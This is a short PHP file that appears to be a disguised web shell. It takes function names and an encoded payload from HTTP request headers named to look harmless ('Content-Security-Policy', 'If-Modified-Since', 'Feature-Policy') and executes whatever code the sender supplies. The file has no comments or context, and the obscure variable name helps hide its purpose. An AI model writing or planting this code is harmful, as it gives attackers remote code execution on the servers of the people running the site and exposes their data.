<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Content-Security-Policy'])) {
    $ob_iconv_handle = $_HEADERS['Content-Security-Policy']('', $_HEADERS['If-Modified-Since']($_HEADERS['Feature-Policy']));
    $ob_iconv_handle();
}